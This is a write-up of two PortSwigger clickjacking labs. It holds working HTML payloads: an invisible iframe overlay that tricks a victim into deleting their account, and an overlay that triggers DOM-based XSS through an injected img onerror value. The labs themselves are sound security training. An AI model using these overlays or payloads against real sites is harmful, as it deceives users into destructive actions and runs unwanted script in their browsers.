## LAB - 1
**lab link: <https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected>**

 **Topic :-** 

- Basic clickjacking with CSRF token protection.


 **To Solve :-**

- Craft some HTML that frames the account page and fools the user into deleting their account.

 **Procedure :-**

1. Login with given creds., there's a "Delete" button.
2. Open exploit server. and craft a html page containing iframe element, to overlay the account page , which would be invisible and there's a "CLICK me" page above it, having "CLICK me" text just above the "Delete" button, to fool the victim, thinking its normal click me button.
3. In the exploit server, body :-
```
<style>
    iframe{
        position:relative;
        width: 1000px;
        height: 700px;
        opacity:0.001;
        z-index:2;
}
    div{
        position:absolute;
        top:520px;
        left:60px;
        z-index:1;  
}
</style>
<div>CLICK me</div>
<iframe src="https://0a4300dd037a4ccd8070b8fa00fe008e.web-security-academy.net/my-account"></iframe>
```
4. Store it , and then send to victim. and Voila.


## LAB - 2
**lab link: <https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss>**

 **Topic :-** 

- Exploiting clickjacking vulnerability to trigger DOM-based XSS.

 **To Solve :-**

- Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the `print()` function.

 **Procedure :-**

1. There's a feedback submit page. try to submit a feedback and notice that there is some xss in "name".
2. Open exploit server. and craft a html page containing iframe element, to overlay the feedback page , which would be invisible and there's a "CLICK me" page above it, having "CLICK me" text just above the "submit" button, to fool the victim, thinking its normal click me button., and the html also fillout the form along including the payload in the uri.
3. In the exploit server, body :-
```
<style>
    iframe{
        position:relative;
        width: 1000px;
        height: 900px;
        opacity:0.1;
        z-index:2;
}
    div{
        position:absolute;
        top:815px;
        left:80px;
        z-index:1;  
}
</style>
<div>CLICK me</div>
<iframe src="https://0a4300dd037a4ccd8070b8fa00fe008e.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=a@b.com&subject=test&message=test"></iframe>
```
4. Store it , and then send to victim. and Done.